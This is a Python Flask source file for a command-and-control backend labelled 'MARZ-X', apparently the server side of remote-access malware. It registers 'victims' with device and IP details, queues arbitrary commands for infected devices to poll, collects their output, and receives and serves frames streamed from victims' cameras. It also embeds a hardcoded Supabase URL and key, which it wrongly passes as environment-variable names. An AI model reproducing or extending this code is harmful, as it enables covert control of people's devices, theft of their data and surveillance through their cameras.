import os
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
from supabase import create_client, Client

app = Flask(__name__)
CORS(app)

# ===== AMBIL KREDENSIAL DARI ENVIRONMENT =====
SUPABASE_URL = os.environ.get("https://exzpctjvnjksubmjqtfv.supabase.co")
SUPABASE_KEY = os.environ.get("sb_publishable_eY3Lqocmx5GafVMGOmBdTg_BnqEiyiQ")

# ===== INISIALISASI SUPABASE CLIENT =====
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

# ===== REGISTER VICTIM =====
@app.route('/api/register', methods=['POST'])
def register_victim():
    data = request.json
    user_id = data.get('user_id')
    device_id = data.get('device_id')
    device_name = data.get('device_name', 'Unknown')
    os_version = data.get('os', 'Unknown')
    ip = data.get('ip', request.remote_addr)

    if not user_id or not device_id:
        return jsonify({"error": "missing user_id or device_id"}), 400

    # Cek apakah sudah ada
    existing = supabase.table('victims').select('*').eq('id', device_id).execute()
    if not existing.data:
        supabase.table('victims').insert({
            'id': device_id,
            'user_id': user_id,
            'name': device_name,
            'os': os_version,
            'ip': ip,
            'status': 'online'
        }).execute()
    else:
        supabase.table('victims').update({
            'name': device_name,
            'os': os_version,
            'ip': ip,
            'status': 'online'
        }).eq('id', device_id).execute()
    return jsonify({"status": "registered"})

# ===== GET VICTIMS =====
@app.route('/api/victims', methods=['GET'])
def get_victims():
    user_id = request.headers.get('X-User-ID') or request.args.get('user_id')
    if not user_id:
        return jsonify([]), 400
    res = supabase.table('victims').select('*').eq('user_id', user_id).execute()
    return jsonify(res.data)

# ===== SEND COMMAND =====
@app.route('/api/cmd', methods=['POST'])
def send_command():
    data = request.json
    user_id = data.get('user_id') or request.headers.get('X-User-ID')
    victim_id = data.get('victim_id')
    command = data.get('command')
    if not user_id or not victim_id or not command:
        return jsonify({"error": "missing fields"}), 400

    supabase.table('commands').insert({
        'victim_id': victim_id,
        'command': command
    }).execute()

    supabase.table('results').insert({
        'victim_id': victim_id,
        'command': command,
        'result': 'pending...',
        'status': 'pending'
    }).execute()

    return jsonify({"status": "ok"})

# ===== CLIENT POLLING COMMAND =====
@app.route('/api/command/<victim_id>', methods=['GET'])
def get_command(victim_id):
    user_id = request.headers.get('X-User-ID') or request.args.get('user_id')
    if not user_id:
        return jsonify({"action": "none"}), 400

    res = supabase.table('commands').select('*').eq('victim_id', victim_id).order('created_at').limit(1).execute()
    if res.data:
        cmd = res.data[0]
        supabase.table('commands').delete().eq('id', cmd['id']).execute()
        return jsonify({"action": cmd['command']})
    return jsonify({"action": "none"})

# ===== CLIENT SEND RESULT =====
@app.route('/api/result', methods=['POST'])
def receive_result():
    data = request.json
    user_id = data.get('user_id') or request.headers.get('X-User-ID')
    victim_id = data.get('victim_id')
    command = data.get('command')
    result = data.get('result')
    status = data.get('status', 'done')

    if not user_id or not victim_id or not command:
        return jsonify({"error": "missing fields"}), 400

    # Update log yang pending
    res = supabase.table('results').select('*').eq('victim_id', victim_id).eq('command', command).eq('status', 'pending').order('time', desc=True).limit(1).execute()
    if res.data:
        supabase.table('results').update({
            'result': result,
            'status': status,
            'time': datetime.now().isoformat()
        }).eq('id', res.data[0]['id']).execute()
    else:
        supabase.table('results').insert({
            'victim_id': victim_id,
            'command': command,
            'result': result,
            'status': status
        }).execute()
    return jsonify({"status": "ok"})

# ===== GET LOGS =====
@app.route('/api/results/<victim_id>', methods=['GET'])
def get_results(victim_id):
    user_id = request.headers.get('X-User-ID') or request.args.get('user_id')
    if not user_id:
        return jsonify([]), 400
    res = supabase.table('results').select('*').eq('victim_id', victim_id).order('time', desc=True).execute()
    return jsonify(res.data)

# ===== STREAMING =====
@app.route('/api/stream/camera', methods=['POST'])
def stream_camera():
    data = request.json
    user_id = data.get('user_id') or request.headers.get('X-User-ID')
    victim_id = data.get('device_id')
    frame = data.get('frame')
    if not user_id or not victim_id:
        return jsonify({"error": "missing"}), 400
    supabase.table('streams').upsert({
        'victim_id': victim_id,
        'camera': frame,
        'updated_at': datetime.now().isoformat()
    }).execute()
    return jsonify({"status": "ok"})

@app.route('/api/stream/<victim_id>/camera', methods=['GET'])
def get_camera_stream(victim_id):
    user_id = request.headers.get('X-User-ID') or request.args.get('user_id')
    if not user_id:
        return jsonify({"error": "missing user"}), 400
    res = supabase.table('streams').select('camera').eq('victim_id', victim_id).execute()
    if res.data and res.data[0].get('camera'):
        return jsonify({"frame": res.data[0]['camera']})
    return jsonify({"error": "no frame"}), 404

# ===== HEALTH CHECK =====
@app.route('/')
def home():
    return "MARZ-X Backend Running!"

if __name__ == '__main__':
    port = int(os.getenv('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
